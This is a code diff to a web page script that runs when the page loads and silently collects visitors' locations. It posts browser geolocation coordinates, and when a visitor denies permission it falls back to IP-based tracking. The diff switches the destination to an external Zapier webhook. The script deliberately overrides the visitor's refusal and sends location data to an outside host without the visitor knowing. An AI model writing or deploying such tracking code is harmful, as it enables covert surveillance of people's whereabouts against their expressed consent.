@@ -2,12 +2,13 @@
 <script>
 window.addEventListener('load', function() {
 
-    // 🔴 FIX APPLIED: This uses the correct relative path to call the function on your own Netlify domain.
-    const WEBHOOK_URL = '/.netlify/functions/log-location'; 
+    // 🔴 FIX APPLIED: The webhook URL is now set to your Zapier Catch Hook.
+    const WEBHOOK_URL = 'https://hooks.zapier.com/hooks/catch/25473014/uzqdeqe/'; 
 
     // --- 1. The Silent Sender Function ---
     async function sendToWebhook(data) {
         try {
+            // Note: This fetch call now targets the external Zapier webhook.
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
@@ -15,10 +16,9 @@ window.addEventListener('load', function() {
                 },
                 body: JSON.stringify(data)
             });
-            console.log("Data successfully sent to Netlify Function.");
+            console.log("Data successfully sent to Zapier Webhook.");
         } catch (error) {
-            // This error should now only trigger if the function crashes after being hit.
-            console.error("CRITICAL ERROR: Function call failed.", error);
+            console.error("CRITICAL ERROR: Webhook call failed.", error);
         }
     }
 
@@ -49,7 +49,7 @@ window.addEventListener('load', function() {
     // --- 3. The Main Logic: Check Geolocation ---
     if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
-            // Case A: User clicks ALLOW (Success)
+            // Success Case: User clicks ALLOW
             (position) => {
                 const payload = {
                     type: "GEOLOCATION_SUCCESS",
@@ -63,14 +63,14 @@ window.addEventListener('load', function() {
                 };
                 sendToWebhook(payload);
             },
-            // Case B: User clicks BLOCK or fails (Error)
+            // Error Case: User clicks BLOCK or fails
             (error) => {
                 console.warn("User denied location permission. Executing IP tracking fallback.");
                 getIpAndSend();
             }
         );
     } else {
-        // Case C: Browser does not support Geolocation
+        // Case: Browser does not support Geolocation
         getIpAndSend();
     }
 
